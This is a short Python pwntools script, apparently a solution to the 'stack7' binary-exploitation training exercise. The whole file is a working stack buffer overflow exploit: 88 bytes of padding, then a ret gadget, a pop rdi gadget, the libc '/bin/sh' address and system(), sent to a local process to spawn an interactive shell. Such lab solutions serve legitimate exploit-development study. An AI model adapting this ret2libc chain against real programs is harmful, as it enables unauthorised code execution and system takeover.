#stack7.py

from pwn import *

system = p64(0x7ffff7a31420)
bin_sh = p64(0x7ffff7b95d88)
pop_rdi = p64(0x00400773)
ret = p64(0x00400700)
offset = 88

payload = 'A'*offset + ret + pop_rdi + bin_sh + system

p = process('./stack7')
p.sendline(payload)
p.interactive()
